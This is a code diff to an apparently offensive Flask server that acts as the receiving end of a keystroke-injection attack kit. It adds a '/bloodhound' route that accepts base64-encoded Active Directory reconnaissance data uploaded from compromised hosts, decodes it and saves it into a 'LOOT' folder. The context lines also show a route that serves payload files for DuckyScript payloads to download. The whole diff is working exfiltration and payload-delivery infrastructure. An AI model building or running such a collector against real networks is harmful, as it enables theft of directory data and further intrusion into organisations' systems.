@@ -79,6 +79,27 @@ def upload_sysinfo():
     return "OK"
 
 
+@app.route("/bloodhound", methods=["POST"])
+def upload_bloodhound():
+    """Receive base64-encoded BloodHound JSON v5 from bloodhound_collect.ps1."""
+    host = _safe_name(request.form.get("host", "unk"))
+    bh_type = _safe_name(request.form.get("type", "unknown"))
+    raw  = request.form.get("data", "")
+    if not raw:
+        return "missing data", 400
+    try:
+        import urllib.parse
+        decoded = urllib.parse.unquote(raw)
+        data = base64.b64decode(decoded).decode("utf-8", errors="replace")
+    except (binascii.Error, ValueError):
+        return "invalid base64", 400
+    dest = LOOT / "bloodhound" / f"{host}_{bh_type}.json"
+    dest.parent.mkdir(parents=True, exist_ok=True)
+    dest.write_text(data, encoding="utf-8")
+    print(f"[+] BloodHound {bh_type} from {host} → {dest}")
+    return "OK"
+
+
 @app.route("/serve/<name>")
 def serve_file(name: str):
     """Serve a payload file so DuckyScript payloads can download it."""
